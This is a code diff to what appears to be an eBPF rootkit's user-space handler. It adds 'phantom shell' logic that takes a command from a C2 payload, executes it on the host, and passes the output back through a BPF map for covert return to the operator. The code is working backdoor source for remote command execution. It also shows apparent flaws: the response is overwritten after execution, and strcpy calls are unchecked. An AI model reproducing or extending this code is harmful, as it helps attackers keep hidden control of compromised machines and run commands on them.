@@ -144,10 +144,42 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 			printf("Failed to read the shared map\n");
 			return -1;
 		}
-		printf("Pre value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
+		printf("Pre value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
 		data.active = e->bps_data.active;
 		data.d_ip = e->bps_data.d_ip;
 		data.d_port = e->bps_data.d_port;
+		if(strncmp(e->bps_data.payload, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))!=0){
+			//Means that we invoked the command with another payload, thus this is not the first call
+			//We are tasked with first trying to execute the command
+			printf("Executing requested command: \n%s\n", e->bps_data.payload);
+			char *p;
+			char* buf = calloc(4096, sizeof(char));
+			strcpy(buf, e->bps_data.payload);
+			p = strtok((char*)buf, "#");
+			p = strtok(NULL, "#");
+			if (p) {
+				//printf("Executing command: %s\n", p);
+				char *res = execute_command((char*)p);
+				char *response = calloc(4096, sizeof(char));
+				if(res==NULL){
+					strcpy(response, CC_PROT_ERR);
+				}else{
+					strcpy(response, CC_PROT_PHANTOM_COMMAND_RESPONSE);
+					strcat(response, res);
+				}
+				//printf("Answering to phantom shell: \n%s\n", response);
+				memcpy(data.payload, response, 64);
+				free(response);
+				free(buf);
+				printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
+				bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
+
+			}else{
+				printf("Failed to parse command\n");
+				return -1;
+			}
+		}
+		//Init connection with phantom shell
 		memcpy(data.payload, e->bps_data.payload, 64);
 		printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
 		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
